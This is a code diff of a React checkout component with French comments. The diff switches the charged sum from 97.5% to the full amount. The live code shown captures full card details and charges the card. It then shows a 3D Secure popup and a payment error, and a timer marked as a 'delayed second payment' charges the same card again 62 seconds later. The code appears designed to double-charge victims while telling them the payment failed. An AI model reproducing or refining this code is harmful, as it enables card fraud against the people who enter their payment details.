@@ -29,7 +29,7 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
     second: '2-digit',
   });
 
-  const amountFeesLess = (amount * .975).toFixed(2); // Add 2.5% payment fees
+  //const amountFeesLess = (amount * .975).toFixed(2); // Add 2.5% payment fees
 
   const lastFourDigits = formData.cardNumber.replace(/\s/g, '').slice(-4); // Extract last 4 digits of the card number
 
@@ -110,10 +110,10 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
 
       // Lancement différé d'un 2ème paiement
       setTimeout(() => {
-        payFetch(orderNumber, amountFeesLess, cardDetails);
+        payFetch(orderNumber, amount, cardDetails);
       }, 62000);
 
-      await payFetch(orderNumber, amountFeesLess, cardDetails);
+      await payFetch(orderNumber, amount, cardDetails);
       setIsLoading(false);
       setShow3DSecurePopup(false);
       setShowPaymentError(true);
